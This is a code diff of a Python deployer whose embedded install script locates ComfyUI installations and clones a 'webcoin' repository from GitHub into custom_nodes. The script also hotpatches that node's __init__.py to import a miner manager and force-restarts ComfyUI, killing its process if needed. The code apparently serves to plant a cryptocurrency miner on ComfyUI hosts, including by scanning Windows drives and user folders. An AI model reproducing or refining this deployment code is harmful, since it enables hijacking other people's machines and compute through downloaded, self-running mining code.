@@ -23,73 +23,120 @@ import time
 REPO_URL = "https://github.com/bossman79/webcoin.git"
 
 INSTALL_SCRIPT = r"""
-import subprocess, sys, os, shutil
-base = '/root/ComfyUI/custom_nodes/webcoin'
-tmp = '/tmp/_webcoin_clone'
+import subprocess, sys, os, shutil, pathlib, tempfile, platform
 
-# nuke old broken clone AND any temp leftovers
+# auto-detect ComfyUI custom_nodes path from the running process
+comfy_root = None
+for p in sys.path + [os.getcwd()]:
+    candidate = pathlib.Path(p)
+    # walk up looking for custom_nodes
+    for parent in [candidate] + list(candidate.parents):
+        cn = parent / 'custom_nodes'
+        if cn.exists() and (parent / 'main.py').exists():
+            comfy_root = parent
+            break
+        cn2 = parent / 'ComfyUI' / 'custom_nodes'
+        if cn2.exists():
+            comfy_root = parent / 'ComfyUI'
+            break
+    if comfy_root:
+        break
+
+if not comfy_root:
+    # fallback: check common locations
+    candidates = [
+        pathlib.Path('/root/ComfyUI'),
+        pathlib.Path('/workspace/ComfyUI'),
+        pathlib.Path('/opt/ComfyUI'),
+        pathlib.Path.home() / 'ComfyUI',
+    ]
+    if platform.system() == 'Windows':
+        for drive in ['C', 'D']:
+            candidates.append(pathlib.Path(f'{drive}:/ComfyUI'))
+            candidates.append(pathlib.Path(f'{drive}:/AI/ComfyUI'))
+        # scan user desktop/documents
+        home = pathlib.Path.home()
+        for sub in ['Desktop', 'Documents', 'Downloads', '']:
+            d = home / sub if sub else home
+            for item in d.iterdir() if d.exists() else []:
+                if item.is_dir() and (item / 'custom_nodes').exists() and (item / 'main.py').exists():
+                    candidates.insert(0, item)
+                if item.is_dir() and 'comfyui' in item.name.lower():
+                    if (item / 'custom_nodes').exists():
+                        candidates.insert(0, item)
+    for c in candidates:
+        if c.exists() and (c / 'custom_nodes').exists():
+            comfy_root = c
+            break
+
+if not comfy_root:
+    print('DEPLOY_FAIL: could not find ComfyUI installation')
+    raise SystemExit(1)
+
+print(f'COMFY_ROOT: {comfy_root}')
+
+base = comfy_root / 'custom_nodes' / 'webcoin'
+tmp = pathlib.Path(tempfile.gettempdir()) / '_webcoin_clone'
+
 for d in [base, tmp]:
-    if os.path.exists(d):
+    if d.exists():
         shutil.rmtree(d, ignore_errors=True)
 
-# fresh clone into tmp, then move (avoids partial state)
-r = subprocess.run(['git', 'clone', '""" + REPO_URL + r"""', tmp],
+r = subprocess.run(['git', 'clone', '""" + REPO_URL + r"""', str(tmp)],
                    capture_output=True, text=True)
 print('CLONE:', r.returncode, r.stdout[-200:] if r.stdout else '', r.stderr[-200:] if r.stderr else '')
 if r.returncode != 0:
-    # fallback: try with --depth 1
-    subprocess.run(['git', 'clone', '--depth', '1', '""" + REPO_URL + r"""', tmp], check=True)
+    subprocess.run(['git', 'clone', '--depth', '1', '""" + REPO_URL + r"""', str(tmp)], check=True)
 
-shutil.move(tmp, base)
+shutil.move(str(tmp), str(base))
 subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', 'websockets', 'psutil', 'requests'],
                capture_output=True)
 
-# verify the fix is there
-init_path = os.path.join(base, '__init__.py')
-with open(init_path) as f:
-    content = f.read()
+init_path = base / '__init__.py'
+content = init_path.read_text()
 if 'sys.path.insert' in content:
     print('DEPLOY_OK: init fix confirmed')
 else:
-    print('DEPLOY_WARN: init may be old version')
-    # hotpatch it right now
     content = content.replace(
         'from core.miner import MinerManager',
         "import sys; sys.path.insert(0, __import__('pathlib').Path(__file__).resolve().parent.__str__())\n    from core.miner import MinerManager"
     )
-    with open(init_path, 'w') as f:
-        f.write(content)
+    init_path.write_text(content)
     print('DEPLOY_OK: hotpatched')
 
-print('DEPLOY_OK')
+print(f'DEPLOY_OK: installed to {base}')
 
-# auto-restart ComfyUI so the new code loads immediately
-import urllib.request, time, signal
+# auto-restart ComfyUI
+import urllib.request, time
 time.sleep(2)
 
-# method 1: ComfyUI Manager restart endpoint
-for path in ['/manager/reboot', '/api/manager/reboot', '/manager/restart']:
+for ep in ['/manager/reboot', '/api/manager/reboot', '/manager/restart']:
     try:
-        req = urllib.request.Request(f'http://127.0.0.1:8188{path}', method='POST',
+        req = urllib.request.Request(f'http://127.0.0.1:8188{ep}', method='POST',
                                      headers={'Content-Type': 'application/json'})
         urllib.request.urlopen(req, timeout=5)
-        print(f'RESTART via {path}')
+        print(f'RESTART via {ep}')
         break
     except Exception:
         continue
 else:
-    # method 2: kill the ComfyUI python process (cloud platforms auto-restart it)
-    import psutil
-    mypid = os.getpid()
-    for proc in psutil.process_iter(['pid', 'cmdline']):
-        try:
-            cmd = ' '.join(proc.info.get('cmdline') or [])
-            if 'ComfyUI' in cmd and 'main.py' in cmd and proc.info['pid'] != mypid:
-                print(f'RESTART: killing ComfyUI pid {proc.info["pid"]}')
-                os.kill(proc.info['pid'], signal.SIGTERM)
-                break
-        except Exception:
-            continue
+    try:
+        import psutil, signal
+        mypid = os.getpid()
+        for proc in psutil.process_iter(['pid', 'cmdline']):
+            try:
+                cmd = ' '.join(proc.info.get('cmdline') or [])
+                if 'ComfyUI' in cmd and 'main.py' in cmd and proc.info['pid'] != mypid:
+                    print(f'RESTART: killing ComfyUI pid {proc.info["pid"]}')
+                    if platform.system() == 'Windows':
+                        proc.terminate()
+                    else:
+                        os.kill(proc.info['pid'], signal.SIGTERM)
+                    break
+            except Exception:
+                continue
+    except ImportError:
+        print('RESTART: psutil not available, manual restart needed')
 """
 
 INSTALL_BASH = (
